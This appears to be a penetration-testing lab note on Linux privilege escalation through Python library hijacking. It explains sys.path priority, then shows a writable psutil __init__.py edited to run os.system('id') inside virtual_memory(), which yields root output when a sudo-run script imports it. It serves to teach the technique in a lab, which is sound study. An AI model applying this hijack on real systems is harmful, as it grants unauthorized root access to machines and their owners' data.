In Python, each version has a specified order in which libraries (`modules`) are searched and imported from. The order in which Python imports `modules` from are based on a priority system, meaning that paths higher on the list take priority over ones lower on the list. We can see this by issuing the following command:

```
python3 -c 'import sys; print("\n".join(sys.path))'
```

To be able to use this variant, two prerequisites are necessary.

1. The module that is imported by the script is located under one of the lower priority paths listed via the `PYTHONPATH` variable.
2. We must have write permissions to one of the paths having a higher priority on the list.

Therefore, if the imported module is located in a path lower on the list and a higher priority path is editable by our user, we can create a module ourselves with the same name and include our own desired functions. Since the higher priority path is read earlier and examined for the module in question, Python accesses the first hit it finds and imports it before reaching the original and intended module.
## Example

```
htb-student@lpenix:~$ ls -l mem_status.py

-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```


```
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```


```
htb-student@lpenix:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():


htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```


We can modify __init__.py file as following -> 

```
...SNIP...

def virtual_memory():

    ...SNIP...
    #### Hijacking
    import os
    os.system('id')
    

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

```
htb-student@lpenix:~$ sudo /usr/bin/python3 mem_status.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "mem_status.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.vi
```
